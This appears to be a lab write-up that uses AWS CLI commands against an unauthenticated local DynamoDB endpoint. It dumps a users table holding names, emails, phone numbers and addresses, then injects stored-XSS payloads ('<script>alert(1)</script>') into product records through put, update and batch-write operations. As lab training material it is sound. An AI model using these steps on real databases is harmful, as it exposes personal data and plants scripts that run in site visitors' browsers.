# DynamoDB

## List all the tables

```
root@attackdefense:~# aws --endpoint http://192.100.131.3:4567 dynamodb list-tables
{
    "TableNames": [
        "cards",
        "orders",
        "products",
        "sellers",
        "users"
    ]
}
```

## Scan table

```
root@attackdefense:~# aws --endpoint http://192.100.131.3:4567 dynamodb scan --table users
{
    "Items": [
        {
            "UserId": {
                "S": "99"
            },
            "RegisteredOn": {
                "S": "2018-01-25"
            },
            "UserName": {
                "S": "Cody Obrien"
            },
            "UserEmail": {
                "S": "cody obriencody3897@gmail.com"
            },
            "PhoneNo": {
                "S": "2922013890"
            },
            "UserAddress": {
                "S": "4186 Eu Rd.,Phoenix,44904,United States"
            },
            "Country": {
                "S": "USA"
            }
        },
        {
            "UserId": {
                "S": "73"
            },
            "RegisteredOn": {
                "S": "2018-07-26"
            },
            "UserName": {
                "S": "Addison Valencia"
            },
            "UserEmail": {
                "S": "addison valenciaaddison3561@gmail.com"
            },
            "PhoneNo": {
                "S": "2695517080"
            },
            "UserAddress": {
                "S": "Ap #640-7803 Egestas Ave,Racine,30018,United States"
            },
            "Country": {
                "S": "USA"
            }
        }
    ],
    "Count": 100,
    "ScannedCount": 100,
    "ConsumedCapacity": null
}
```

## Find userId of a specific user

```
root@attackdefense:~# cat attribute_value.json
{
        ":value": {"S": "Amber Patrick"}
}
root@attackdefense:~# aws --endpoint http://192.100.131.3:4567 dynamodb scan --table users --filter-expression "UserName = :value" --projection-expression "UserId" --expression-attribute-values file://attribute_value.json
{
    "Items": [
        {
            "UserId": {
                "S": "15"
            }
        }
    ],
    "Count": 1,
    "ScannedCount": 100,
    "ConsumedCapacity": null
}
```

## Find name of product with specific productID

ProductId is the hash key

```
root@attackdefense:~# aws --endpoint http://192.100.131.3:4567 dynamodb describe-table --table products{
    "Table": {
        "AttributeDefinitions": [
            {
                "AttributeName": "ProductId",
                "AttributeType": "S"
            }
        ],
        "TableName": "products",
        "KeySchema": [
            {
                "AttributeName": "ProductId",
                "KeyType": "HASH"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": 1569004984.957,
        "ProvisionedThroughput": {
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 5,
            "WriteCapacityUnits": 5
        },
        "TableSizeBytes": 0,
        "ItemCount": 0,
        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/products",
        "TableId": "ca78d441-cf7a-49d4-560a-cb2630e3"
    }
}
```

Perform a query

```
root@attackdefense:~# cat attribute_value.json
{
        ":value": {"S": "9"}
}
root@attackdefense:~# aws --endpoint http://192.100.131.3:4567 dynamodb query --table products --key-condition-expression "ProductId =:value" --expression-attribute-values file://attribute_value.json{
    "Items": [
        {
            "ProductId": {
                "S": "9"
            },
            "PublishOn": {
                "S": "2018-01-01"
            },
            "ProductName": {
                "S": "IPhone X"
            },
            "ProductDescription": {
                "S": "Limited Time Discount on IPhone X"
            },
            "Category": {
                "S": "Mobile"
            },
            "Rating": {
                "N": "5"
            },
            "Price": {
                "S": "1045$"
            },
            "Reviews": {
                "M": {}
            },
            "SellerId": {
                "S": "2"
            },
            "features": {
                "M": {
                    "weight": {
                        "S": "170g"
                    },
                    "color": {
                        "S": "red"
                    },
                    "warranty": {
                        "S": "5 years"
                    }
                }
            }
        }
    ],
    "Count": 1,
    "ScannedCount": 1,
    "ConsumedCapacity": null
}
```

## Add item to product table with XSS payload

```
root@attackdefense:~# cat item.json
{
        "ProductId": {
                "S": "1000"
        },
        "ProductName": {
                "S": "Attacker's object"
        },
        "ProductDescription": {
                "S": "<script>alert(1)</script>"
        }
}
root@attackdefense:~# aws --endpoint http://192.100.131.3:4567 dynamodb put-item --table products --item file://item.json
```

Check for inserted product item

```
root@attackdefense:~# cat key.json
{
         "ProductId": {
                 "S": "1000"
         }
}
root@attackdefense:~# aws --endpoint http://192.100.131.3:4567 dynamodb get-item --table products --key file://key.json
{
    "Item": {
        "ProductId": {
            "S": "1000"
        },
        "ProductName": {
            "S": "Attacker's object"
        },
        "ProductDescription": {
            "S": "<script>alert(1)</script>"
        }
    }
}
```

## Modify an item and add XSS payload

Create key and item json files

```
root@attackdefense:~# cat key.json
{
         "ProductId": {
                 "S": "1"
         }
}
root@attackdefense:~# cat item.json
{
        ":value": {
                "S": "<script>alert(1)</script>"
        }
}
```

Put item and check if description has been changed

```
root@attackdefense:~# aws --endpoint http://192.100.131.3:4567 dynamodb update-item --table products --key file://key.json --update-expression "SET ProductDescription = :value" --expression-attribute-values file://item.json
root@attackdefense:~# aws --endpoint http://192.100.131.3:4567 dynamodb get-item --table products --key file://key.json{
    "Item": {
        "ProductId": {
            "S": "1"
        },
        "PublishOn": {
            "S": "2018-01-01"
        },
        "ProductName": {
            "S": "Hoodie"
        },
        "ProductDescription": {
            "S": "<script>alert(1)</script>"
        },
        "Category": {
            "S": "Clothing"
        },
        "Rating": {
            "N": "4.5"
        },
        "Price": {
            "S": "45$"
        },
        "Reviews": {
            "M": {}
        },
        "SellerId": {
            "S": "1"
        },
        "features": {
            "M": {
                "color": {
                    "S": "red"
                },
                "weight": {
                    "S": "750g"
                },
                "size": {
                    "S": "M"
                }
            }
        }
    }
}
```

## Perform batch operation and inject XSS to any 3 products

```
root@attackdefense:~# cat items.json{
  "products": [
    {
      "PutRequest": {
        "Item": {
          "ProductId": {
            "S": "2"
          },
          "ProductName": {
            "S": "Attackers's object"
          },
          "ProductDescription": {
            "S": "<script>alert(1)</script>"
          }
        }
      }
    },
    {
      "PutRequest": {
        "Item": {
          "ProductId": {
            "S": "3"
          },
          "ProductName": {
            "S": "Attackers's object"
          },
          "ProductDescription": {
            "S": "<script>alert(1)</script>"
          }
        }
      }
    },
    {
      "PutRequest": {
        "Item": {
          "ProductId": {
            "S": "4"
          },
          "ProductName": {
            "S": "Attackers's object"
          },
          "ProductDescription": {
            "S": "<script>alert(1)</script>"
          }
        }
      }
    }
  ]
}

root@attackdefense:~# aws --endpoint http://192.100.131.3:4567 dynamodb batch-write-item --request-items file://items.json
{
    "UnprocessedItems": {}
}
```

Check if XSS payload was injected successfully

```
root@attackdefense:~# cat attribute_value.json{        ":value1": {
                "S": "2"
        },
        ":value2": {
                "S": "3"
        },
        ":value3": {
                "S": "4"
        }
}
root@attackdefense:~# aws --endpoint http://192.100.131.3:4567 dynamodb scan --table products --filter-expression "ProductId = :value1 or ProductId = :value2 or ProductId = :value3" --projection-expression "ProductDescription" --expression-attribute-values file://attribute_value.json
{
    "Items": [
        {
            "ProductDescription": {
                "S": "<script>alert(1)</script>"
            }
        },
        {
            "ProductDescription": {
                "S": "<script>alert(1)</script>"
            }
        },
        {
            "ProductDescription": {
                "S": "<script>alert(1)</script>"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 11,
    "ConsumedCapacity": null
}
```
